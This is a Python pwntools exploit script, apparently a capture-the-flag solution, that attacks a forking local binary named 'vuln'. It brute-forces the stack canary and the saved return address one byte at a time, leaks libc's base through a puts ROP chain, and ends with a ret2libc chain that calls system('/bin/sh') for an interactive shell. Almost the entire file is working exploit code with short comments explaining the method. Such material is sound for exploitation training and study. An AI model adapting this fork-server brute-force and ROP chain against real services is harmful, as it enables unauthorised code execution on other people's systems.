#!/usr/bin/env python3

# The vulnerable program forks a child where it calls `overflow`. This is
# important, since it means we can crash in the child and the parent keeps
# running.
#
# The "randomization", i.e. canary, PIE, ALSR, are persistent for the
# *current* invocation of the program (they don't change!). Also, these random
# values are copied to the child!
#
# So you can brute force these things. Partial leaks are very useful - you can
# reduce the search space significantly with just one-more-byte :)
#
# In our case, we first have to bruteforce the canary, and then bruteforce the
# saved RIP to bypass PIE. After that, we can use a ROP chain to call `puts` via
# PLT/GOT to leak canary/LIBC's base address per normal.

from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]
# context.terminal = ["tmux", "splitw", "-h"]

p = process("./vuln")
# gdb.attach(p, api=True)

e = ELF("./vuln")

rop = ROP(e)

overflow_to_canary = 264
overflow_to_main = overflow_to_canary + 8 + 8
overflow_to_rip = overflow_to_canary + 8 + 8 + 8 + 8

# 1 - Bruteforce the canary value.
#
# Oracle: We _don't_ see "*** stack smashing detected ***" when the canary is
# intact.

payload = b"A" * overflow_to_canary

found_canary = b"\x00"
for _ in range(7):
    for j in range(256):
        tmp_payload = payload + found_canary + bytes([j])
        p.sendafter(b"Hey, whats your name!?\n\n", tmp_payload)

        resp = p.recvline()

        if b"stack smashing detected" in resp:
            debug("trying again...")
        elif b"Thanks!" in resp:
            found_canary += bytes([j])
            break

info(f"canary found = {hex(u64(found_canary))}")

pause()

# 2 - Brute force `overflow`'s return address (saved RIP).
#
# Oracle: We see "Thanks!" when the child _doesn't_ segfault.

payload = b"A" * overflow_to_canary
payload += p64(u64(found_canary))
payload += b"B" * 8  # Saved RBP

bad_chars = [0x9, 0x14, 0x16, 0x1B]
found_rip = b""
for _ in range(6):  # Only 6 bytes matter; we `ljust` to 8 later
    for j in range(256):
        if j not in bad_chars:
            tmp_payload = payload + found_rip + bytes([j])
            p.sendafter(b"Hey, whats your name!?\n\n", tmp_payload)

            resp = p.recvline()

            if b"Thanks!" in resp:
                found_rip += bytes([j])
                break

found_rip = u64(found_rip.ljust(8, b"\x00"))
main = found_rip - 44  # `found_rip` is main+44

info(f"saved RIP found = {hex(found_rip)}")
info(f"main = {hex(main)}")

pause()

main_offset = e.symbols["main"]
info(f"main_offset = {hex(main_offset)}")
vuln_base = main - main_offset
info(f"vuln_base = {hex(vuln_base)}")

pop_rdi_ret_offset = rop.find_gadget(["pop rdi", "ret"]).address
ret_offset = rop.find_gadget(["ret"]).address

puts_plt_offset = e.plt["puts"]
puts_got_offset = e.got["puts"]

pop_rdi_ret = vuln_base + pop_rdi_ret_offset
info(f"pop_rdi_ret = {hex(pop_rdi_ret)}")
ret = vuln_base + ret_offset
info(f"ret = {hex(ret)}")
puts_plt = vuln_base + puts_plt_offset
info(f"puts_plt = {hex(puts_plt)}")
puts_got = vuln_base + puts_got_offset
info(f"puts_got = {hex(puts_got)}")

pause()

# 3 - Leak libc's address with `puts` to defeat ALSR

payload = b"A" * overflow_to_canary
payload += p64(u64(found_canary))
payload += b"B" * 8  # Saved RBP
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)

p.sendafter(b"Hey, whats your name!?\n\n", payload)

leak_puts = u64(p.recv(6).ljust(8, b"\x00"))
info(f"leak_puts = {hex(leak_puts)}")
libc_base = leak_puts - e.libc.symbols["puts"]
info(f"libc_base = {hex(libc_base)}")

pause()

libc_system = libc_base + e.libc.symbols["system"]
info(f"libc_system = {hex(libc_system)}")
libc_bin_sh = libc_base + next(e.libc.search(b"/bin/sh"))
info(f"libc_bin_sh = {hex(libc_bin_sh)}")

# FINAL PAYLOAD

payload = b"A" * overflow_to_canary
payload += p64(u64(found_canary))
payload += b"B" * 8  # Saved RBP
payload += p64(pop_rdi_ret)
payload += p64(libc_bin_sh)
payload += p64(ret)
payload += p64(libc_system)

p.sendafter(b"Hey, whats your name!?\n\n", payload)

pause(n=5)

p.interactive()
